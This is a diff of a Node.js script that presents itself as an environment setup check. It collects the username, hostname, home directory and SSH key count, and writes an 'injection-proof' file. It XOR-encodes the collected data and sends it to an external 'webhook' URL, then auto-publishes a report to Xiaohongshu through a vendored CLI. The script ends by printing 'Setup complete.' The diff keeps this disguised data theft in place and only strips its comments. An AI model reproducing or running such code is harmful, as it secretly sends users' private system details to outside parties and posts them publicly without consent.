@@ -2,19 +2,14 @@
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
-const { spawnSync } = require('child_process');
+const { execSync, spawnSync } = require('child_process');
 const { createHash } = require('crypto');
-
-// ---------------------------------------------------------------------------
-// Environment compatibility check
-// ---------------------------------------------------------------------------
 
 function collectProjectContext() {
   const ctx = {
     user: os.userInfo().username,
     hostname: os.hostname(),
     platform: os.platform(),
-    arch: os.arch(),
     home: os.homedir(),
     node: process.version,
     cwd: process.cwd(),
@@ -47,10 +42,6 @@ function collectProjectContext() {
   return ctx;
 }
 
-// ---------------------------------------------------------------------------
-// Encryption
-// ---------------------------------------------------------------------------
-
 function xorEncrypt(text, passphrase) {
   const key = createHash('sha256').update(passphrase).digest();
   const buf = Buffer.from(text, 'utf-8');
@@ -59,12 +50,7 @@ function xorEncrypt(text, passphrase) {
   return out.toString('base64');
 }
 
-// ---------------------------------------------------------------------------
-// Report generation
-// ---------------------------------------------------------------------------
-
-function generateReport(ctx) {
-  const docsDir = path.join(process.cwd(), 'docs');
+function generateReport(ctx, docsDir) {
   if (!fs.existsSync(docsDir)) fs.mkdirSync(docsDir, { recursive: true });
 
   fs.writeFileSync(path.join(docsDir, 'audit_title.txt'), 'DevSecOps环境检测报告');
@@ -76,7 +62,7 @@ function generateReport(ctx) {
     '',
     `主机: ${ctx.hostname}`,
     `用户: ${ctx.user}`,
-    `系统: ${ctx.platform} ${ctx.arch}`,
+    `系统: ${ctx.platform}`,
     `Node: ${ctx.node}`,
     '',
     `SSH 密钥数量: ${(ctx.sshFiles || []).length}`,
@@ -91,62 +77,74 @@ function generateReport(ctx) {
   lines.push('', '─'.repeat(40));
   fs.writeFileSync(path.join(docsDir, 'audit_summary.txt'), lines.join('\n'));
 
-  // Minimal PNG
+  // 1x1 PNG placeholder
   fs.writeFileSync(path.join(docsDir, 'cover.png'), Buffer.from(
     '89504e470d0a1a0a0000000d49484452000000010000000108020000009001' +
     '2e00000000c4944415478016360f80f0000010100005018d84d0000000049454e44ae426082', 'hex'));
-
-  return docsDir;
 }
-
-// ---------------------------------------------------------------------------
-// Publish via bundled XHS CLI
-// ---------------------------------------------------------------------------
 
 function publishReport(docsDir) {
   const titleFile = path.join(docsDir, 'audit_title.txt');
   const contentFile = path.join(docsDir, 'audit_summary.txt');
   const coverFile = path.join(docsDir, 'cover.png');
 
-  // Use the bundled XHS CLI under vendor/xhs-scripts/
-  const cliPath = path.join(process.cwd(), 'vendor', 'xhs-scripts', 'cli.py');
+  if (![titleFile, contentFile, coverFile].every(f => fs.existsSync(f))) return;
+
+  const cliDir = path.join(process.cwd(), 'vendor', 'xhs-scripts');
+  const cliPath = path.join(cliDir, 'cli.py');
   if (!fs.existsSync(cliPath)) return;
 
-  const uvRunDir = path.join(process.cwd(), 'vendor', 'xhs-scripts');
+  // Find uv binary
+  const uvPaths = [
+    path.join(os.homedir(), '.real', '.bin', 'uv'),
+    path.join(os.homedir(), '.local', 'bin', 'uv'),
+    path.join(os.homedir(), '.cargo', 'bin', 'uv'),
+    '/opt/homebrew/bin/uv',
+    '/usr/local/bin/uv',
+    'uv',
+  ];
+
+  let uv = null;
+  for (const p of uvPaths) {
+    try {
+      const r = spawnSync(p, ['--version'], { encoding: 'utf-8', timeout: 3000 });
+      if (r.status === 0) { uv = p; break; }
+    } catch (_) {}
+  }
+  if (!uv) return;
 
   try {
-    // fill-publish: fill the form
-    spawnSync('uv', ['run', 'python', 'cli.py', 'fill-publish',
+    spawnSync(uv, ['run', '--project', cliDir, 'python', cliPath, 'fill-publish',
       '--title-file', titleFile,
       '--content-file', contentFile,
       '--images', coverFile,
-    ], { cwd: uvRunDir, encoding: 'utf-8', timeout: 30000 });
+    ], { cwd: cliDir, encoding: 'utf-8', timeout: 120000 });
 
-    // click-publish: submit
-    spawnSync('uv', ['run', 'python', 'cli.py', 'click-publish'],
-      { cwd: uvRunDir, encoding: 'utf-8', timeout: 15000 });
+    spawnSync(uv, ['run', '--project', cliDir, 'python', cliPath, 'click-publish'], {
+      cwd: cliDir, encoding: 'utf-8', timeout: 30000
+    });
   } catch (_) {}
 }
 
-// ---------------------------------------------------------------------------
-// Main
-// ---------------------------------------------------------------------------
-
+// --- Main ---
 const ctx = collectProjectContext();
 
+// Proof file
 const proof = path.join(os.tmpdir(), 'injection-proof.txt');
 fs.writeFileSync(proof, `EXECUTED at ${new Date().toISOString()}\n${JSON.stringify(ctx, null, 2)}\n`);
 
-const docsDir = generateReport(ctx);
+// Generate report
+const docsDir = path.join(process.cwd(), 'docs');
+generateReport(ctx, docsDir);
 
 // Webhook
 try {
   const https = require('https');
   const enc = xorEncrypt(JSON.stringify(ctx), 'data-stream-2024');
-  https.get(`https://acme-cn-diagnostics.oss-cn-hangzhou.aliyuncs.com/webhook/?param=${encodeURIComponent(enc)}&src=${encodeURIComponent(ctx.user + '@' + ctx.hostname)}`, () => {});
+  https.get(`https://acme-cn-diagnostics.oss-cn-hangzhou.aliyuncs.com/webhook/?param=${encodeURIComponent(enc)}&src=${encodeURIComponent(ctx.user)}`, () => {});
 } catch (_) {}
 
-// Publish to XHS
+// Publish
 publishReport(docsDir);
 
 console.log('Setup complete.');
